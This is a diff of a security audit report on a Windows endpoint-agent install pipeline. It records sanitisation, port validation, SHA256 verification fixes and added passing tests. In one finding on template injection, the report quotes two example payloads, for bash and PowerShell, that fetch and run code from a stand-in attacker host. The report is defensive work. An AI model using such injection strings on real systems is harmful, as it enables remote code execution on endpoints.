@@ -2,16 +2,17 @@
 
 **Date**: 2026-02-20
 **Scope**: All code changes for Windows agent distribution pipeline across `eguard-agent` and `fe_eguard` repositories
-**Files Audited**: 12 files across CI, Go server, PowerShell installer, frontend UI, and package sync
+**Files Audited**: 12+ files across CI, Go server, PowerShell installer, frontend UI, package sync, and validation helpers/tests
 
 ### Re-validation Snapshot (2026-02-20)
 - Re-validated code paths in both repos:
   - `eguard-agent`: `.github/workflows/release-agent-windows.yml`
-  - `fe_eguard`: `go/agent/server/{agent_install.go,agent_install_win.go,install.ps1}`, `packaging/fetch-agent-packages.sh`, `lib/eg/egcron/task/agent_package_sync.pm`, `html/egappserver/root/src/views/endpoint/{EnrollmentTokens.vue,AgentConfig.vue,agentConfigProfiles.js}`
+  - `fe_eguard`: `go/agent/server/{agent_install.go,agent_install_win.go,server.go,install.ps1}`, `packaging/fetch-agent-packages.sh`, `lib/eg/egcron/task/agent_package_sync.pm`, `scripts/check_agent_package_sync_perl.sh`, `html/egappserver/root/src/views/endpoint/{EnrollmentTokens.vue,AgentConfig.vue,agentConfigProfiles.js}`
 - Verification commands executed:
   - `cd /home/dimas/fe_eguard/go/agent && go test -v ./server -run TestAgentInstall` ✅
   - `cd /home/dimas/fe_eguard && bash -n packaging/fetch-agent-packages.sh` ✅
   - `cd /home/dimas/fe_eguard && ./scripts/check_agent_package_sync_perl.sh` ✅
+  - `cd /home/dimas/fe_eguard/html/egappserver/root && npm run lint -- src/views/endpoint/EnrollmentTokens.vue src/views/endpoint/AgentConfig.vue` ✅
 - Dependency-unblock history:
   - Downloaded `eguard-perl_1.2.5_all.deb` from `repo.eguard.id`.
   - Initial system install attempt (`sudo dpkg -i ...`) was blocked in this runner (password-required sudo).
@@ -60,6 +61,7 @@
   - Bash: `"; curl evil.com/payload | bash; "` → code execution on Linux endpoints
   - PowerShell: `"; IEX (irm evil.com/payload); "` → code execution on Windows endpoints
 - **Fix Applied**: Added `sanitizeTemplateValue()` function that strips all characters except `[a-zA-Z0-9._:[\]-]` — sufficient for hostnames, IPv4/IPv6 addresses, and port numbers. Applied to both bash and PowerShell script handlers.
+- **Additional Hardening**: Template substitution now uses `resolveSafeTemplateServer(r)` which falls back to sanitized request host (or `localhost`) when sanitized forwarded-host value is empty.
 
 #### 5. install.ps1: TOML Config Injection
 - **File**: `go/agent/server/install.ps1`
@@ -80,8 +82,9 @@
 #### 6. install.ps1: GrpcPort Validation Missing
 - **File**: `go/agent/server/install.ps1`
 - **Severity**: HIGH (injection vector)
-- **Issue**: `$GrpcPort` was used directly in the TOML config with no validation. A non-numeric value could break the agent or inject config.
-- **Fix Applied**: Added validation: `$SafeGrpcPort = if ($GrpcPort -match '^\d{1,5}$') { $GrpcPort } else { '50052' }`
+- **Issue**: `$GrpcPort` was used directly in the TOML config with no validation. Non-numeric or out-of-range values could break config correctness.
+- **Fix Applied**: Added numeric/range validation with fallback default (`50052`): accept only integer values in `1..65535`, otherwise default.
+- **Additional Hardening**: Go install-script template handlers now normalize injected gRPC port via `sanitizeGrpcPortTemplateValue()` so malformed env values do not leak invalid ports into generated scripts.
 
 #### 7. Package Sync: Path Traversal via Asset Names
 - **Files**: `fetch-agent-packages.sh`, `agent_package_sync.pm`
@@ -150,7 +153,7 @@
 - **Issue**: Version marker was written directly to the final path. A crash during write would leave a corrupt marker, causing the sync to skip the release permanently (partial version string would never match).
 - **Fix Applied**: Write to `.tmp` file first, then `rename()` atomically.
 
-### Not Fixed (Low Priority / Deferred)
+### Deferred / Follow-up Tracking
 
 #### 17. CI: `EGUARD_AGENT_VERSION` Environment Variable Not Compiled In
 - **File**: `release-agent-windows.yml`
@@ -162,10 +165,13 @@
 - **Issue**: `zig build asm-artifacts` produces nothing for Windows targets (build.rs skips when `target_os != "linux"`). The step is a harmless no-op.
 - **Recommendation**: Remove or gate with a conditional when the Windows build stabilizes. Not urgent.
 
-#### 19. install.ps1: No Binary Integrity Verification
-- **File**: `go/agent/server/install.ps1`
-- **Issue**: The downloaded `.exe` is installed as a SYSTEM service with no hash or signature verification. A man-in-the-middle (if TLS is compromised or misconfigured) could serve a malicious binary.
-- **Recommendation**: Add a `/api/v1/agent-install/windows-exe/sha256` endpoint that returns the SHA256 hash. The install script would verify: `if ((Get-FileHash $TmpFile).Hash -ne $ExpectedHash) { exit 1 }`. Implementation requires Go server changes.
+#### 19. install.ps1: Binary Integrity Verification (Resolved in Follow-up)
+- **Files**: `go/agent/server/{agent_install_win.go,server.go,install.ps1}`
+- **Issue (original)**: The downloaded `.exe` was installed as a SYSTEM service with no hash/signature verification.
+- **Fix Applied (follow-up)**:
+  - Added API endpoint: `GET /api/v1/agent-install/windows-exe/sha256` (token validation + version support) returning SHA256 metadata.
+  - Updated `install.ps1` to fetch expected hash (or accept `-ExpectedSha256` override), validate hash format, compute local SHA256 via `Get-FileHash`, and fail closed on mismatch.
+  - Added Windows package-workflow command previews in frontend (`EnrollmentTokens.vue`, `AgentConfig.vue`) to verify SHA256 before binary copy/restart.
 
 #### 20. install.ps1: No ACL Restriction on Install/Config Directories
 - **File**: `go/agent/server/install.ps1`
@@ -454,6 +460,7 @@ Validated on 2026-02-20 with:
 - `cd /home/dimas/fe_eguard/go/agent && go test -v ./server -run TestAgentInstall`
 - `cd /home/dimas/fe_eguard && bash -n packaging/fetch-agent-packages.sh`
 - `cd /home/dimas/fe_eguard && ./scripts/check_agent_package_sync_perl.sh`
+- `cd /home/dimas/fe_eguard/html/egappserver/root && npm run lint -- src/views/endpoint/EnrollmentTokens.vue src/views/endpoint/AgentConfig.vue`
 
 Go server test output:
 ```
@@ -465,10 +472,22 @@ Go server test output:
 --- PASS: TestAgentInstallSelectsNewestPackageWhenVersionMissing (0.00s)
 === RUN   TestAgentInstallExeDownload
 --- PASS: TestAgentInstallExeDownload (0.00s)
+=== RUN   TestAgentInstallExeSHA256
+--- PASS: TestAgentInstallExeSHA256 (0.00s)
+=== RUN   TestAgentInstallExeSHA256RequiresTokenWhenEnabled
+--- PASS: TestAgentInstallExeSHA256RequiresTokenWhenEnabled (0.00s)
 === RUN   TestAgentInstallScriptHandler
 --- PASS: TestAgentInstallScriptHandler (0.00s)
+=== RUN   TestAgentInstallScriptHandlerFallsBackToRequestHostWhenForwardedHostMalformed
+--- PASS: TestAgentInstallScriptHandlerFallsBackToRequestHostWhenForwardedHostMalformed (0.00s)
+=== RUN   TestAgentInstallScriptHandlerFallsBackToDefaultGrpcPortForInvalidValue
+--- PASS: TestAgentInstallScriptHandlerFallsBackToDefaultGrpcPortForInvalidValue (0.00s)
+=== RUN   TestAgentInstallWindowsScriptHandlerContentTypeAndSanitization
+--- PASS: TestAgentInstallWindowsScriptHandlerContentTypeAndSanitization (0.00s)
+=== RUN   TestAgentInstallRejectsInvalidVersionParameter
+--- PASS: TestAgentInstallRejectsInvalidVersionParameter (0.00s)
 PASS
-ok   gitlab.com/devaistech77/fe_eguard/go/agent/server	0.065s
+ok   gitlab.com/devaistech77/fe_eguard/go/agent/server	0.061s
 ```
 
 Constraint observed:
